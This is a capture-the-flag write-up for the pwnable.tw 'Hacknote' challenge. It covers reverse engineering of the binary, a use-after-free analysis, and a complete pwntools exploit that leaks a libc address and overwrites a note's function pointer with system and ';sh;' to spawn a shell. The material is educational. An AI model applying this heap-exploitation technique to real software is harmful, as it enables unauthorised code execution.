---
date: '2025-08-29T12:42:01+07:00'
draft: false
title: 'Hacknote (200 pts) - pwnable.tw'
tags: ["pwnable.tw"]
---
---
## 0x1. Initial Reconnaissance 

### file
<!-- ![Getting Started](./images/pwntw-hacknote/file.png) -->
```
↪ file hacknote
hacknote: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped
```

### checksec
<!-- ![Getting Started](./images/pwntw-hacknote/checksec.png) -->
```
↪ checksec --file=hacknote
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	No	0		2		hacknote

```

### ./hacknote
<!-- ![Getting Started](./images/pwntw-hacknote/run.png) -->
```
↪ ./hacknote
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :
```

---

## 0x2. Reverse Engineering

### Add_note
```c
unsigned int sub_8048646()
{
  int v0; // ebx
  int v2; // [esp-Ch] [ebp-34h]
  int v3; // [esp-Ch] [ebp-34h]
  int v4; // [esp-8h] [ebp-30h]
  int v5; // [esp-8h] [ebp-30h]
  int v6; // [esp-4h] [ebp-2Ch]
  int i; // [esp+Ch] [ebp-1Ch]
  int v8; // [esp+10h] [ebp-18h]
  char v9[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v10; // [esp+1Ch] [ebp-Ch]

  v10 = __readgsdword(0x14u);
  if ( dword_804A04C <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !dword_804A050[i] )
      {
        dword_804A050[i] = malloc(8);
        if ( !dword_804A050[i] )
        {
          puts("Alloca Error");
          exit(-1, v2, v4, v6);
        }
        *(_DWORD *)dword_804A050[i] = sub_804862B;
        printf("Note size :");
        read(0, v9, 8);
        v8 = atoi(v9);
        v0 = dword_804A050[i];
        *(_DWORD *)(v0 + 4) = malloc(v8);
        if ( !*(_DWORD *)(dword_804A050[i] + 4) )
        {
          puts("Alloca Error");
          exit(-1, v3, v5, v6);
        }
        printf("Content :");
        read(0, *(_DWORD *)(dword_804A050[i] + 4), v8);
        puts("Success !");
        ++dword_804A04C;
        return __readgsdword(0x14u) ^ v10;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v10;
}
```

### Delete_note
```c
unsigned int sub_80487D4()
{
  int v1; // [esp-Ch] [ebp-24h]
  int v2; // [esp-8h] [ebp-20h]
  int v3; // [esp-4h] [ebp-1Ch]
  int v4; // [esp+4h] [ebp-14h]
  char v5[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v6; // [esp+Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  printf("Index :");
  read(0, v5, 4);
  v4 = atoi(v5);
  if ( v4 < 0 || v4 >= dword_804A04C )
  {
    puts("Out of bound!");
    _exit(0, v1, v2, v3);
  }
  if ( dword_804A050[v4] )
  {
    free(*(_DWORD *)(dword_804A050[v4] + 4));
    free(dword_804A050[v4]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v6;
```

### Print_note
```c
unsigned int sub_80488A5()
{
  int v1; // [esp-Ch] [ebp-24h]
  int v2; // [esp-8h] [ebp-20h]
  int v3; // [esp-4h] [ebp-1Ch]
  int v4; // [esp+4h] [ebp-14h]
  char v5[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v6; // [esp+Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  printf("Index :");
  read(0, v5, 4);
  v4 = atoi(v5);
  if ( v4 < 0 || v4 >= dword_804A04C )
  {
    puts("Out of bound!");
    _exit(0, v1, v2, v3);
  }
  if ( dword_804A050[v4] )
    (*(void (__cdecl **)(int))dword_804A050[v4])(dword_804A050[v4]);
  return __readgsdword(0x14u) ^ v6;
}
```
---

## 0x3. Analysis

Take a look at Add_note function, you can see that a variable at 0x804a4c (data section) used to make sure that you just get to use add_note option 6 times by checking whether it's less than 6 or not at the beginning and increasing it by 1 after adding a new note. But see inside the if condition, they just allow us to use add_note option 5 times. The reason is that they use a 5-variables array, stored at 0x804a050, and when you choose the option 1, they will check whether are there any available slot, if not they do nothing.
When you add a new note, they will create a chunk of 8 bytes and a chunk of your chosen size. The first chunk will be stored at the array i mentioned above, and used as a struct(the first element stores a funtion (sub_804862B), the second one stores the address of the second chunk).
```c
int __cdecl sub_804862B(int a1)
{
  return puts(*(_DWORD *)(a1 + 4));
}
```

Let's see the Print_note, they will call the function stored at the the first chunk (it's the function above), and pass its address to this function too. Finally, they will print everything at the address stored at the second element. 
Next, the Delete_note function, they just free the second chunk, then the first one, but <b>they don't assign the element of the array back to null or 0</b>, that's why I tell you that, you just get to use add_note functions 5 times.

---

## 0x4. Exploit

When you free a chunk, if its size is greater than 80 bytes and isn't adjacent to the top chunk (to do this just add another note in the middle), it will be put in unsorted bin (doubly linked-list) and if there is just only one chunk in unsorted bin, its previous and next pointer would point to the address of main arena in libc (the manager of bins). And when you add a new note having exactly the same size, they will give you the chunk from unsorted bin but don't reset this chunk, that means you can get the address of main arena and calculate the libc_base address, system's address, etc... 
###### After free a chunk of 100 bytes:
```
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x804b010
Size: 0x68 (with flag bits: 0x69)
fd: 0xf7fcb7b0
bk: 0xf7fcb7b0
```

###### Add a new note of 100 bytes after free and overwrite the first 4 bytes:
```
pwndbg> x/2wx 0x804b018
0x804b018:	0x41414141	0xf7fcb70a
```

As I analysed above, when adding a new note, they create a chunk of 8 bytes containing the function that print out our note, I will call it <b> the special chunk </b>. As a result, if we delete 2 notes and add a new note of 8 bytes, we will get a special chunk of the notes we just deleted and get to overwrite them and run our desired function, in that case will be system function. Because they pass the address of the special chunk to my function, we can write the system address and ";sh;" to the special chunk. So that, when we choose to print note, the system function will run the address of system (that's should be error) and then the command "sh", next will run the command right after ';'. 

###### Exploit:
```py
from pwn import *

exe = ELF("./hacknote_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *0x080489ef")
    else:
        r = remote("chall.pwnable.tw", 10102)

    return r

def add_note (p, size, content):
    p.sendlineafter (b'Your choice :', b'1')
    p.sendafter (b'Note size :', size)
    p.sendafter (b'Content :', content)

def free (p, index):
    p.sendafter (b'Your choice :', b'2')
    p.sendafter (b'Index :', index)

def print_note (p, index):
    p.sendafter (b'Your choice :', b'3')
    p.sendafter (b'Index :', index)

def main():
    p = conn()
    print_chunk_content = 0x0804862b

    add_note (p, b'100', b'nguyendd')
    add_note (p, b'30', b'ndd')
    free (p, b'0')
    add_note (p, b'100', b'A' * 4)
    print_note (p, b'0')

    p.recvuntil (b'A' * 4)
    main_arena = u32 (p.recv (4))
    libc_base = main_arena - 0x1B07B0
    print ("The address of main_arena is : ", hex (main_arena))
    print ("The address of libc base is : ", hex (libc_base))

    
    free (p, b'2')
    free (p, b'1')
    add_note (p, b'8', p32 (libc_base + libc.symbols['system']) + b';sh;')
    print_note (p, b'0')

    p.interactive()


if __name__ == "__main__":
    main()
```


